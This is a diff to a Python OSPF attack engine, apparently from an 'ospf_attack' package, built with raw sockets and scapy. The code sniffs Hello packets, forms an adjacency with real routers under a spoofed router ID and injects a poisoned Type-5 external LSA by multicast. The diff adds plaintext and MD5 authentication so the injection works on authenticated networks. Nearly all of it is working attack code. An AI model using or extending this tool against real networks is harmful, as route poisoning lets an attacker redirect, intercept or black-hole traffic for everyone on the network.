@@ -8,9 +8,9 @@ Usage:
     engine.sniff(timeout=15)       # learn topology from Hello
     engine.establish(timeout=60)   # reach Full adjacency
     engine.inject_lsa(...)         # inject poison LSA
-    engine.shutdown()
 """
 
+import functools
 import socket
 import struct
 import threading
@@ -18,9 +18,16 @@ import time
 from dataclasses import dataclass, field
 from typing import Optional
 
-from scapy.all import IP, raw, send
+
+@functools.lru_cache(maxsize=32)
+def _ip_bytes(ip: str) -> bytes:
+    """Convert dotted-decimal IP string to 4-byte bytes (cached)."""
+    return bytes(int(x) for x in ip.split("."))
+
+from scapy.all import IP, send
 from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
 
+from .auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5, build_ospf_auth, _pad_key, _MD5_TRAILER_LEN
 from .neighbor import NeighborState
 
 
@@ -64,73 +71,92 @@ def _hello_bytes(
     dead_interval: int = 40, dr: str = "0.0.0.0",
     bdr: str = "0.0.0.0", options: int = 0x02,
     neighbors: list[str] | None = None,
+    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
+    crypto_seq: int = 1,
 ) -> bytes:
     """Build a complete OSPF Hello as raw bytes (IP+OSPF)."""
-    rid = bytes(int(x) for x in router_id.split("."))
-    area_b = bytes(int(x) for x in area_id.split("."))
-    src_b = bytes(int(x) for x in src_ip.split("."))
-    dr_b = bytes(int(x) for x in dr.split("."))
-    bdr_b = bytes(int(x) for x in bdr.split("."))
+    rid = _ip_bytes(router_id)
+    area_b = _ip_bytes(area_id)
+    src_b = _ip_bytes(src_ip)
+    dr_b = _ip_bytes(dr)
+    bdr_b = _ip_bytes(bdr)
 
     # Hello body
-    body = bytes(int(x) for x in "255.255.255.0".split("."))
+    body = _ip_bytes("255.255.255.0")
     body += struct.pack("!H", hello_interval)
     body += bytes([options, priority])
     body += struct.pack("!I", dead_interval)
     body += dr_b + bdr_b
     if neighbors:
         for n in neighbors:
-            body += bytes(int(x) for x in n.split("."))
+            body += _ip_bytes(n)
 
-    # OSPF header
+    # OSPF header with auth
     ospf = struct.pack("!BB", 2, 1) + struct.pack("!H", 24 + len(body))
-    ospf += rid + area_b + struct.pack("!HH", 0, 0) + bytes(8)
+    ospf += rid + area_b + struct.pack("!HH", 0, 0)
+    ospf += struct.pack("!H", auth_type)
+    auth_field, trailer = build_ospf_auth(ospf + body, auth_type, auth_key, crypto_seq)
+    ospf += auth_field
+
     ospf_hdr_body = ospf + body
+    if trailer:
+        ospf_hdr_body += trailer
     chk = _ospf_fletcher(ospf_hdr_body)
     data = ospf_hdr_body[:12] + struct.pack("!H", chk) + ospf_hdr_body[14:]
 
-    # IP header
-    ip = struct.pack("!BB", 0x45, 0x00)
-    ip += struct.pack("!H", 20 + len(data))
-    ip += struct.pack("!HH", 0x0001, 0x0000)
-    ip += struct.pack("!BB", 1, 89)
-    ip += struct.pack("!H", 0)
-    ip += src_b + bytes([224, 0, 0, 5])
+    ip = _build_ip_header(src_b, bytes([224, 0, 0, 5]), len(data), ip_id=0x0001)
+    return ip + data
 
-    s = sum((ip[i] << 8) + ip[i + 1] for i in range(0, 20, 2))
-    s = (s >> 16) + (s & 0xFFFF)
-    s += s >> 16
-    return ip[:10] + struct.pack("!H", (~s) & 0xFFFF) + ip[12:] + data
+
+def _ip_checksum(header: bytes) -> int:
+    """Compute IP header checksum (RFC 1071)."""
+    s = sum((header[i] << 8) + header[i + 1] for i in range(0, 20, 2))
+    while s >> 16:
+        s = (s >> 16) + (s & 0xFFFF)
+    return (~s) & 0xFFFF
+
+
+def _build_ip_header(src_b: bytes, dst_b: bytes, payload_len: int,
+                     ip_id: int = 0, proto: int = 89, ttl: int = 1) -> bytes:
+    """Build IP header with correct checksum."""
+    ip = struct.pack("!BB", 0x45, 0x00)
+    ip += struct.pack("!H", 20 + payload_len)
+    ip += struct.pack("!HH", ip_id, 0x0000)
+    ip += struct.pack("!BB", ttl, proto)
+    ip += struct.pack("!H", 0)
+    ip += src_b + dst_b
+    chk = _ip_checksum(ip)
+    return ip[:10] + struct.pack("!H", chk) + ip[12:]
 
 
 def _dbd_bytes(
-    router_id: str, src_ip: str, dst_ip: str,
+    router_id: str, area_id: str, src_ip: str, dst_ip: str,
     flags: int, ddseq: int,
+    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
+    crypto_seq: int = 1,
 ) -> bytes:
     """Build DBD packet as raw bytes (IP+OSPF+DBD)."""
-    rid = bytes(int(x) for x in router_id.split("."))
-    src_b = bytes(int(x) for x in src_ip.split("."))
-    dst_b = bytes(int(x) for x in dst_ip.split("."))
+    rid = _ip_bytes(router_id)
+    area_b = _ip_bytes(area_id)
+    src_b = _ip_bytes(src_ip)
+    dst_b = _ip_bytes(dst_ip)
 
     body = struct.pack("!H", 1500) + bytes([0x02, flags]) + struct.pack("!I", ddseq)
 
     ospf = struct.pack("!BB", 2, 2) + struct.pack("!H", 24 + len(body))
-    ospf += rid + bytes(4) + struct.pack("!HH", 0, 0) + bytes(8)
+    ospf += rid + area_b + struct.pack("!HH", 0, 0)
+    ospf += struct.pack("!H", auth_type)
+    auth_field, trailer = build_ospf_auth(ospf + body, auth_type, auth_key, crypto_seq)
+    ospf += auth_field
+
     data = ospf + body
+    if trailer:
+        data += trailer
     chk = _ospf_fletcher(data)
     data = data[:12] + struct.pack("!H", chk) + data[14:]
 
-    ip = struct.pack("!BB", 0x45, 0x00)
-    ip += struct.pack("!H", 20 + len(data))
-    ip += struct.pack("!HH", 0x0002, 0x0000)
-    ip += struct.pack("!BB", 1, 89)
-    ip += struct.pack("!H", 0)
-    ip += src_b + dst_b
-
-    s = sum((ip[i] << 8) + ip[i + 1] for i in range(0, 20, 2))
-    s = (s >> 16) + (s & 0xFFFF)
-    s += s >> 16
-    return ip[:10] + struct.pack("!H", (~s) & 0xFFFF) + ip[12:] + data
+    ip = _build_ip_header(src_b, dst_b, len(data), ip_id=0x0002)
+    return ip + data
 
 
 def _type5_lsa_bytes(
@@ -140,8 +166,8 @@ def _type5_lsa_bytes(
     metric: int = 20,
 ) -> bytes:
     """Build Type-5 External LSA with correct Fletcher checksum."""
-    adv = bytes(int(x) for x in advertising_router.split("."))
-    lsid = bytes(int(x) for x in link_state_id.split("."))
+    adv = _ip_bytes(advertising_router)
+    lsid = _ip_bytes(link_state_id)
 
     body = bytes([255, 255, 255, 0])
     body += struct.pack("!I", 0x80000000 | (metric & 0x00FFFFFF))
@@ -159,31 +185,31 @@ def _type5_lsa_bytes(
 
 
 def _lsu_bytes(
-    router_id: str, src_ip: str, dst_ip: str, lsa: bytes,
+    router_id: str, area_id: str, src_ip: str, dst_ip: str, lsa: bytes,
+    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
+    crypto_seq: int = 1,
 ) -> bytes:
     """Build LSU packet with LSA."""
-    rid = bytes(int(x) for x in router_id.split("."))
-    src_b = bytes(int(x) for x in src_ip.split("."))
-    dst_b = bytes(int(x) for x in dst_ip.split("."))
+    rid = _ip_bytes(router_id)
+    area_b = _ip_bytes(area_id)
+    src_b = _ip_bytes(src_ip)
+    dst_b = _ip_bytes(dst_ip)
 
     lsu = struct.pack("!I", 1) + lsa
     ospf = struct.pack("!BB", 2, 4) + struct.pack("!H", 24 + len(lsu))
-    ospf += rid + bytes(4) + struct.pack("!HH", 0, 0) + bytes(8)
+    ospf += rid + area_b + struct.pack("!HH", 0, 0)
+    ospf += struct.pack("!H", auth_type)
+    auth_field, trailer = build_ospf_auth(ospf + lsu, auth_type, auth_key, crypto_seq)
+    ospf += auth_field
+
     data = ospf + lsu
+    if trailer:
+        data += trailer
     chk = _ospf_fletcher(data)
     data = data[:12] + struct.pack("!H", chk) + data[14:]
 
-    ip = struct.pack("!BB", 0x45, 0x00)
-    ip += struct.pack("!H", 20 + len(data))
-    ip += struct.pack("!HH", 0x0004, 0x0000)
-    ip += struct.pack("!BB", 1, 89)
-    ip += struct.pack("!H", 0)
-    ip += src_b + dst_b
-
-    s = sum((ip[i] << 8) + ip[i + 1] for i in range(0, 20, 2))
-    s = (s >> 16) + (s & 0xFFFF)
-    s += s >> 16
-    return ip[:10] + struct.pack("!H", (~s) & 0xFFFF) + ip[12:] + data
+    ip = _build_ip_header(src_b, dst_b, len(data), ip_id=0x0004)
+    return ip + data
 
 
 # ---------------------------------------------------------------------------
@@ -205,7 +231,7 @@ def sniff_ospf_hello(iface: str = "eth0",
     while time.time() < deadline:
         try:
             data, _ = sock.recvfrom(65535)
-            iphl = (data[0] & 0x0F) * 4 if data[0] & 0xF0 == 0x40 else 0
+            iphl = (data[0] & 0x0F) * 4 if (data[0] & 0xF0) == 0x40 else 0
             if len(data) < iphl + 44 or data[iphl + 1] != 1:
                 continue
             ospf = iphl
@@ -239,10 +265,14 @@ def sniff_ospf_hello(iface: str = "eth0",
 class ActiveOSPFEngine:
     """Full OSPF adjacency establishment + LSA injection."""
 
-    def __init__(self, iface: str, spoofed_router_id: str):
+    def __init__(self, iface: str, spoofed_router_id: str,
+                 auth_type: int = AUTH_NONE, auth_key: bytes = b""):
         self.iface = iface
         self.spoofed_rid = spoofed_router_id
         self.params: SniffedParams | None = None
+        self.auth_type = auth_type
+        self.auth_key = auth_key
+        self._crypto_seq = 1
 
         from ospf_attack.network.adapter import get_local_ip
         self.src_ip = get_local_ip(iface)
@@ -251,8 +281,6 @@ class ActiveOSPFEngine:
         self._lock = threading.Lock()
         self._stop = threading.Event()
 
-        # Sockets
-        self._sock: socket.socket | None = None
         self._recv: socket.socket | None = None
 
         # Threads
@@ -349,8 +377,13 @@ class ActiveOSPFEngine:
         """Inject poison LSA via LSU. Call after establish() succeeds."""
         lsa = _type5_lsa_bytes(
             self.spoofed_rid, link_state_id, sequence, metric)
+        seq = self._crypto_seq
+        self._crypto_seq += 1
         raw_pkt = _lsu_bytes(
-            self.spoofed_rid, self.src_ip, "224.0.0.6", lsa)
+            self.spoofed_rid, self.params.area_id,
+            self.src_ip, "224.0.0.6", lsa,
+            auth_type=self.auth_type, auth_key=self.auth_key,
+            crypto_seq=seq)
 
         try:
             self._send_raw(raw_pkt, "224.0.0.6")
@@ -365,13 +398,11 @@ class ActiveOSPFEngine:
     def shutdown(self):
         """Stop and clean up."""
         self._stop.set()
-        for s in (self._sock, self._recv):
-            if s:
-                try:
-                    s.close()
-                except Exception:
-                    pass
-        self.state = NeighborState.DOWN
+        if self._recv:
+            try:
+                self._recv.close()
+            except Exception:
+                pass
 
     # ------------------------------------------------------------------
     # Hello loop
@@ -420,7 +451,7 @@ class ActiveOSPFEngine:
                 data = raw_frame[14:]  # IP packet starts after Ethernet
 
                 iphl = (data[0] & 0x0F) * 4 \
-                    if data[0] & 0xF0 == 0x40 else 0
+                    if (data[0] & 0xF0) == 0x40 else 0
                 if len(data) < iphl + 24:
                     continue
 
@@ -444,19 +475,24 @@ class ActiveOSPFEngine:
                         if self.state == NeighborState.INIT:
                             self.state = NeighborState.TWO_WAY
 
-                    # Start DBD exchange with DR once 2-Way is confirmed
+                    # Start DBD exchange once 2-Way is confirmed
+                    # Prefer DR as DBD peer; fall back to any neighbor
                     if (self.state == NeighborState.TWO_WAY
                             and not dbd_started
-                            and src_rid in two_way_confirmed
-                            and dr_ip):
+                            and src_rid in two_way_confirmed):
+                        dbd_peer = dr_ip if dr_ip and dr_ip != "0.0.0.0" else peer_ip
                         self.state = NeighborState.EXSTART
+                        seq = self._crypto_seq
+                        self._crypto_seq += 1
                         dbd = _dbd_bytes(
-                            self.spoofed_rid, self.src_ip,
-                            dr_ip, 0x07, self._dbd_seq)
-                        self._send_raw(dbd, dr_ip)
+                            self.spoofed_rid, self.params.area_id,
+                            self.src_ip, dbd_peer, 0x07, self._dbd_seq,
+                            auth_type=self.auth_type, auth_key=self.auth_key,
+                            crypto_seq=seq)
+                        self._send_raw(dbd, dbd_peer)
                         self.dbd_sent += 1
                         dbd_started = True
-                        self.log.append(f"[DBD→DR={dr_ip}]")
+                        self.log.append(f"[DBD→peer={dbd_peer}]")
 
                 # ============ DBD ============
                 elif ptype == 2 and self.state >= NeighborState.EXSTART:
@@ -468,14 +504,19 @@ class ActiveOSPFEngine:
                         "!I", data[dbd_off + 4:dbd_off + 8])[0]
 
                     if flags & 0x01:  # I-bit → peer responding
-                        self._is_master = bool(flags & 0x04)
+                        # Master is the router with higher Router ID (RFC 2328)
+                        self._is_master = self.spoofed_rid > src_rid
                         self.state = NeighborState.EXCHANGE
                         if not self._is_master:
                             self._dbd_seq = seq
                         resp_flags = 0x06 if self._is_master else 0x00
+                        seq = self._crypto_seq
+                        self._crypto_seq += 1
                         dbd2 = _dbd_bytes(
-                            self.spoofed_rid, self.src_ip,
-                            peer_ip, resp_flags, self._dbd_seq)
+                            self.spoofed_rid, self.params.area_id,
+                            self.src_ip, peer_ip, resp_flags, self._dbd_seq,
+                            auth_type=self.auth_type, auth_key=self.auth_key,
+                            crypto_seq=seq)
                         self._send_raw(dbd2, peer_ip)
                         self.dbd_sent += 1
 
